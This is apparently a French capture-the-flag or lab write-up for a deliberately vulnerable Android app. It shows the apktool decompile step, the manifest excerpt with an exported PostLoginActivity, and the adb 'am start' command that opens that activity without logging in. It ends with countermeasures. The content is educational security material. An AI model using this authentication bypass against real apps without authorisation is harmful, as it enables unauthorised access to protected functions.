## Solution

La première étape ici consiste à récupérer les activités de l'application ainsi que l'identifiant de cette dernière. Pour se faire, on décompile l'application pour lire le manifeste.

```sh
$ apktool d vulnerableactivitycomponents.apk
$ cd vulnerableactivitycomponents
$ cat AndroidManifest.xml
```

Dans le manifeste, on remarque 2 activités : LoginActivity et PostLoginActivity. La première possède une action MAIN et une categorie LAUNCHER, il s'agit donc de la page qui apparaît au lancement de l'application et qui possède le formulaire à contourner. On remarque cependant l'activité PostLoginActivity qui, d'après le nom, serait l'activité lancée après autentification. De plus, elle possède le paramètre *exported="true"* ce qui signifie qu'elle est manipulable hors du contexte de l'application.

```XML
<activity android:name=".PostLoginActivity" android:exported="true"></activity>
<activity android:name=".LoginActivity">
	<intent-filter>
		<action android:name="android.intent.action.MAIN" />
		<category android:name="android.intent.category.LAUNCHER" />
	</intent-filter>
</activity>
```

On peut alors utiliser ADB pour lancer l'application sur son mobile (après installation) :

```sh
$ adb shell am start -n com.example.vulnerableactivitycomponents/.PostLoginActivity
```

Et voilà, l'activité apparait sans rien entrer dans le formulaire.


## Contre-mesures

Le plus évident serait de ne pas exporter publiquement des activités, surtout si elles sont bloqués derrière un formulaire. Si vous avez vraiment besoin d'exporter une activité, il faudrait vérifier qui l'a lancée et/ou vérifier si la personne est autentification sur l'application au lancement de l'activité.


